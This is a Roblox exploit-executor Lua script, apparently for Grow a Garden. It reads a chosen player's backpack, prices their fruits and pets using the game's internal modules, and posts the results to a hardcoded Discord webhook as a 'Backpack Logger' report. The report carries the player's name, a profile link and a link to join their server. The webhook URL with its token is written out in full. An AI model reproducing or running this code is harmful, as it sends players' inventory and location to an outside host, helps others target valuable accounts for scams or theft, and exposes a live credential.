task.defer(function()
    repeat task.wait() until game:IsLoaded()

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local HttpService = game:GetService("HttpService")
    local req = (http_request or request or syn and syn.request or fluxus and fluxus.request or getgenv().request or solara and solara.request)

    local LocalPlayer = Players.LocalPlayer
    local TargetPlayer

    -- ✅ Get TargetPlayer
    if targetPlayerName == "me" then
        TargetPlayer = LocalPlayer
    else
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name == targetPlayerName or p.DisplayName == targetPlayerName then
                TargetPlayer = p
                break
            end
        end
        if not TargetPlayer then
            warn("❌ Target player not found: " .. tostring(targetPlayerName))
            return
        end
    end

    local UserId = TargetPlayer.UserId
    local DisplayName = TargetPlayer.DisplayName
    local Username = TargetPlayer.Name
    local ProfileURL = string.format("https://www.roblox.com/users/%d/profile", UserId)
    local GameLink = string.format("https://www.roblox.com/games/%d?jobId=%s", game.PlaceId, game.JobId)

	local webhook = "https://discord.com/api/webhooks/1387065839345340598/VjvgcxMSmlFA1xlxDCrYMZ_7FOrhuqGzzuDb7Exqs8cE_Dloxcw2ctShdR01z3E2s8Rk"

	local function waitForModule(path)
		local result
		while not result do
			pcall(function() result = require(path) end)
			if not result then
				warn("⏳ Waiting for module:", path:GetFullName())
				task.wait(1)
			end
		end
		return result
	end

	repeat task.wait() until LocalPlayer:FindFirstChild("Backpack")
	local TargetPlayer = nil

    if targetPlayerName == "me" then
    	TargetPlayer = Players.LocalPlayer
    else
    	for _, p in pairs(Players:GetPlayers()) do
    		if p.Name == targetPlayerName or p.DisplayName == targetPlayerName then
    			TargetPlayer = p
    			break
    		end
    	end
    
    	if not TargetPlayer then
    		warn("❌ Target player not found: " .. targetPlayerName)
    		return
    	end
    end
    
    local Backpack = TargetPlayer:WaitForChild("Backpack")

	local Item_Module = waitForModule(ReplicatedStorage:WaitForChild("Item_Module"))
	local MutationHandler = waitForModule(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("MutationHandler"))
	local PetUtilities = waitForModule(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("PetServices"):WaitForChild("PetUtilities"))
	local PetRegistry = waitForModule(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
	local NumberUtil = waitForModule(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("NumberUtil"))
	local DataService = waitForModule(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))

	local function FormatNumber(n)
		local str = tostring(n)
		repeat str = str:gsub("^(-?%d+)(%d%d%d)", "%1,%2") until not str:find("^(-?%d+)(%d%d%d)")
		return str
	end

	local function GetCleanName(name)
		return name:gsub("%b[]", ""):gsub("^%s*(.-)%s*$", "%1")
	end

	local function CalculatePlantValue(plant)
		local itemString = plant:FindFirstChild("Item_String")
		local variant = plant:FindFirstChild("Variant")
		local weight = plant:FindFirstChild("Weight")
		if not (itemString and variant and weight) then return 0 end

		local itemData = Item_Module.Return_Data(itemString.Value)
		if not itemData or #itemData < 3 then return 0 end

		local baseValue = itemData[3]
		local weightRequirement = itemData[2]
		local variantMultiplier = Item_Module.Return_Multiplier(variant.Value)
		local mutationMultiplier = MutationHandler:CalcValueMulti(plant)
		local weightRatio = math.clamp(weight.Value / weightRequirement, 0.95, 999999)

		return math.round(baseValue * mutationMultiplier * variantMultiplier * (weightRatio ^ 2))
	end

	local function CalculatePetValue(petTool)
		if petTool:GetAttribute("ItemType") ~= "Pet" then return 0 end
		local petUUID = petTool:GetAttribute("PET_UUID")
		if not petUUID then return 0 end

		local success, data = pcall(function()
			return DataService:GetData()
		end)
		if not success or not data then return 0 end

		local petData = data.PetsData.PetInventory.Data[petUUID]
		if not petData then return 0 end

		local hatchedFrom = petData.PetData.HatchedFrom
		local eggData = PetRegistry.PetEggs[hatchedFrom]
		if not eggData then return 0 end

		local petTypeData = eggData.RarityData.Items[petData.PetType]
		local weightRange = petTypeData.GeneratedPetData.WeightRange
		if not weightRange then return 0 end

		local weightProgress = NumberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
		local weightMultiplier = math.lerp(0.8, 1.2, weightProgress)
		local levelProgress = PetUtilities:GetLevelProgress(petData.PetData.Level)
		local levelMultiplier = math.lerp(0.15, 6, levelProgress)
		local baseSellPrice = PetRegistry.PetList[petData.PetType].SellPrice

		return math.floor(baseSellPrice * weightMultiplier * levelMultiplier)
	end

	local function splitTextIntoChunks(baseLines, maxChars)
		local chunks = {}
		local chunk, charCount = {}, 0

		for _, line in ipairs(baseLines) do
			local len = #line + 1
			if (charCount + len) > maxChars then
				table.insert(chunks, chunk)
				chunk, charCount = {}, 0
			end
			table.insert(chunk, line)
			charCount += len
		end

		if #chunk > 0 then
			table.insert(chunks, chunk)
		end

		return chunks
	end

	local function ScanAndSend()
		local fruitLines = {
			"🍎 Fruits            | Value",
			"---------------------|--------"
		}
		local petLines = {
			"🐾 Pets              | Value",
			"---------------------|--------"
		}

		local totalValue = 0

		for _, tool in ipairs(Backpack:GetChildren()) do
			if tool:IsA("Tool") then
				local name = ""
                if tool:FindFirstChild("Item_String") then
                	name = tostring(tool.Item_String.Value)
                else
                	name = tool.Name:gsub("%b[]", ""):gsub("^%s*(.-)%s*$", "%1")
                end
				local value = 0

				if tool:FindFirstChild("Item_String") then
					value = CalculatePlantValue(tool)
					if value > 0 then
						totalValue += value
						local padded = name .. string.rep(" ", math.max(0, 21 - #name))
						table.insert(fruitLines, padded .. "| $" .. FormatNumber(value))
					end
				elseif tool:GetAttribute("ItemType") == "Pet" then
					value = CalculatePetValue(tool)
					if value > 0 then
						totalValue += value
						local padded = name .. string.rep(" ", math.max(0, 21 - #name))
						table.insert(petLines, padded .. "| $" .. FormatNumber(value))
					end
				end
			end
		end

		if #fruitLines == 2 and #petLines == 2 then
			warn("❌ No valuable items found.")
			return
		end

		local contentLines = {}

		if #fruitLines > 2 then
			for _, line in ipairs(fruitLines) do table.insert(contentLines, line) end
			table.insert(contentLines, "")
		end
		if #petLines > 2 then
			for _, line in ipairs(petLines) do table.insert(contentLines, line) end
			table.insert(contentLines, "")
		end

		table.insert(contentLines, "💰 Total Backpack Value: $" .. FormatNumber(totalValue))

		local messageChunks = splitTextIntoChunks(contentLines, 1800) -- slightly under Discord limit

		-- send each chunk as its own embed/message
		task.spawn(function()
			for i, chunk in ipairs(messageChunks) do
				local desc = string.format(
					"✅ [Join Server](%s)\n🔗 [View Profile](%s)\n```txt\n%s\n```",
					GameLink,
					ProfileURL,
					table.concat(chunk, "\n")
				)

				local payload = HttpService:JSONEncode({
					username = "Backpack Logger",
					embeds = {{
						title = string.format("%s's Backpack (%d/%d)", Username, i, #messageChunks),
						description = desc,
						color = 0x00ff99,
						timestamp = DateTime.now():ToIsoDate()
					}}
				})

				local success, result = pcall(function()
					return req({
						Url = webhook,
						Method = "POST",
						Headers = {["Content-Type"] = "application/json"},
						Body = payload
					})
				end)

				if success then
					print("✅ Sent chunk", i)
				else
					warn("❌ Failed to send chunk", i, result)
				end

				task.wait(1) -- prevent rate limits
			end
		end)
	end

	task.wait(2)
	ScanAndSend()
end)
